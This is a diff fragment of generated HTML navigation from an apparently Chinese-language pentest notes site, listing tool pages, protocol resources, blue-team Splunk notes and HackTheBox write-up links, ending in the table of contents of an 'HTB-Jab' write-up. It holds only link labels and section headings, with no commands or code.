+      <a href="../../../arsenal/burpsuite/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Burpsuite
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/metasploit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/sliver-c2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SliverC2
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/viper/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Viper
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/enumerate-tools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumerate Tools
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/sqlmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    sqlmap
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/ldapsearch/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ldapsearch
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Resources
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            Resources
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/simple-network-service/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简单网络服务渗透
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/powershell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PowerShell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_4" id="__nav_8_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Network
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_4">
+            <span class="md-nav__icon md-icon"></span>
+            Network
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Email/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Email
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_4_2" id="__nav_8_4_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Protocol
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Protocol
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/DNS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/Whois/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Whois
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/ICMP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ICMP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/SSH/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSH
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/LDAP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    LDAP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/NetBIOS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NetBIOS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/SMB/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SMB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/RPC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    RPC
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/WinRM/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WinRM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/SNMP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SNMP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/SMTP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SMTP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/NFS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NFS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/Gopher/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Gopher
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_5" id="__nav_8_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    General
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_5">
+            <span class="md-nav__icon md-icon"></span>
+            General
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    正则表达式
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_6" id="__nav_8_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    API
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_6">
+            <span class="md-nav__icon md-icon"></span>
+            API
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/API/SASL/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SASL
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_7" id="__nav_8_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    PKI
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_7">
+            <span class="md-nav__icon md-icon"></span>
+            PKI
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/PKI/%E5%85%AC%E9%92%A5%E8%AF%81%E4%B9%A6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    公钥证书
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_8" id="__nav_8_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Linux
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_8">
+            <span class="md-nav__icon md-icon"></span>
+            Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/Linux%E5%8F%91%E8%A1%8C%E7%89%88/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux发行版
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/Linux%E5%91%BD%E4%BB%A4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux命令
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/Linux%E5%90%84%E7%A7%8D%E6%8B%AC%E5%8F%B7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux各种括号
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux文件权限
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E5%88%86%E5%8C%BA/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    分区
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E5%91%BD%E4%BB%A4%E9%A3%8E%E6%A0%BC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    命令风格
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E6%8D%A2%E8%A1%8C%E7%AC%A6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    换行符
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    配置Linux图形桌面连接
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/iptables/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    iptables
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    命名管道
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E4%BF%AE%E6%94%B9IP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    修改IP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E7%BB%88%E7%AB%AF/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    终端
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    BlueTeam
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            BlueTeam
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_9_1" id="__nav_9_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Splunk
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9_1">
+            <span class="md-nav__icon md-icon"></span>
+            Splunk
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BlueTeam/Splunk/SPL%20memo/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SPL memo
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Splunk知识点
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BlueTeam/Splunk/Knowledge%20Object/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Knowledge Object
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BlueTeam/Email%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Email安全
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    靶机WriteUp
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            靶机WriteUp
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../active/writeup-template/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WP模板
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Precious/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Precious
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Shoppy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Shoppy
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Soccer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Soccer
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-MetaTwo/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-MetaTwo
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Ambassador/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Ambassador
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-APT/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-APT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-MonitorsTwo/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-MonitorsTwo
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Busqueda/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Busqueda
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-PC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-PC
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Inject/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Inject
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Stocker/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Stocker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-OnlyForYou/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-OnlyForYou
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Escape/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Escape
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Topology/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Topology
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Pilgrimage/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Pilgrimage
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Sau/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Sau
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Authority/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Authority
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Codify/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Codify
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Hospital/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Hospital
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Devvortex/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Devvortex
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Surveillance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Surveillance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    HTB-Jab
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Jab
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#relevant-skills" class="md-nav__link">
+    <span class="md-ellipsis">
+      Relevant Skills
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-path-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Path Overview
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#external-recon-nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      External Recon - nmap
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      攻击路径规划·漏洞分析
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB - 匿名
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ldap-" class="md-nav__link">
+    <span class="md-ellipsis">
+      LDAP - 匿名
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jabberxmpp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Jabber/XMPP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Jabber/XMPP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jabber" class="md-nav__link">
+    <span class="md-ellipsis">
+      连接Jabber获的用户清单
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#asreproast" class="md-nav__link">
+    <span class="md-ellipsis">
+      ASREPRoast
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jmontgomery" class="md-nav__link">
+    <span class="md-ellipsis">
+      jmontgomery凭据下的探索
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="jmontgomery凭据下的探索">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#winrm" class="md-nav__link">
+    <span class="md-ellipsis">
+      winrm连接失败
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB连接失败
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap" class="md-nav__link">
+    <span class="md-ellipsis">
+      LDAP无有用信息
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jabber_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      再次登录Jabber发现新凭据
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#svc_openfire" class="md-nav__link">
+    <span class="md-ellipsis">
+      svc_openfire凭据下的探索
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="svc_openfire凭据下的探索">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound" class="md-nav__link">
+    <span class="md-ellipsis">
+      BloodHound探索
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#executedcom" class="md-nav__link">
+    <span class="md-ellipsis">
+      ExecuteDCOM
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
